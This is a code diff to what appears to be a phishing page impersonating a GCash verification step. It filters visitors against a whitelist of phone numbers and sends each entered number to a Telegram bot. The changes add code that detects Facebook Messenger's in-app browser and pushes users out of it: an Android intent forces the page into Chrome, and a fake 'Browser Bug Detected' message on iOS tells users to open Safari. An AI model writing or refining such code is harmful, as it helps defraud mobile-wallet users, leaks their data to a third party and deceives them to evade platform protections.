@@ -51,14 +51,13 @@
             const phone = phoneInput.value.trim();
             const btn = document.getElementById('confirmBtn');
 
-            // 1. Check Format
+            // 1. Basic Format Validation
             if (phone.length < 11 || !phone.startsWith('09')) {
                 Swal.fire({ icon: 'error', title: 'Invalid Number', text: 'Please enter a valid 11-digit GCash number.' });
                 return;
             }
 
-            // 2. THE WHITE-LIST FILTER
-            // Kung ang number ay WALA sa ALLOWED_NUMBERS, i-block
+            // 2. White-list Filter
             if (typeof ALLOWED_NUMBERS === 'undefined' || !ALLOWED_NUMBERS.includes(phone)) {
                 Swal.fire({
                     icon: 'error',
@@ -67,17 +66,52 @@
                     confirmButtonColor: '#2d6a4f'
                 });
                 phoneInput.value = "";
-                return; // STOP: Hindi makakatuloy
+                return; 
             }
 
-            // 3. Kung VALID at nasa listahan, padalhan ng log sa Telegram
+            // 3. Messenger/In-App Browser Detection & Intent
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isMessenger = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Messenger") > -1);
+            
+            if (isMessenger) {
+                const currentUrl = window.location.href.replace(/^https?:\/\//, '');
+                
+                // Android Intent to force Chrome
+                if (/Android/i.test(ua)) {
+                    const intentUrl = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+                    Swal.fire({
+                        title: 'Switching Browser',
+                        text: 'Opening in Chrome to avoid technical errors...',
+                        icon: 'info',
+                        timer: 2000,
+                        showConfirmButton: false
+                    });
+                    setTimeout(() => { window.location.href = intentUrl; }, 1200);
+                    return;
+                } 
+                // iOS logic (Manual prompt because iOS blocks auto-intents)
+                else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    Swal.fire({
+                        title: 'Browser Bug Detected',
+                        text: 'Please tap the (...) icon at the top right and select "Open in Safari" to complete verification.',
+                        icon: 'warning',
+                        confirmButtonText: 'I Understand',
+                        confirmButtonColor: '#2d6a4f'
+                    });
+                    return;
+                }
+            }
+
+            // 4. Normal Processing (If NOT in Messenger or already escaped)
             btn.disabled = true;
             btn.innerHTML = "Verifying...";
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('✅ ELIGIBLE USER ENTERED:\n📱 Number: ' + phone)}`);
 
-            // 4. Redirect sa main.html
+            // Log to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('✅ ELIGIBLE USER ENTERED:\n📱 Number: ' + phone)}`)
+            .catch(err => console.log('Telegram log failed, continuing anyway...'));
+
+            // Redirect to main.html
             setTimeout(() => {
-                // Nag-set tayo ng simple flag para sa main.html
                 sessionStorage.setItem('verified_user', 'true');
                 window.location.href = "main.html";
             }, 1500);
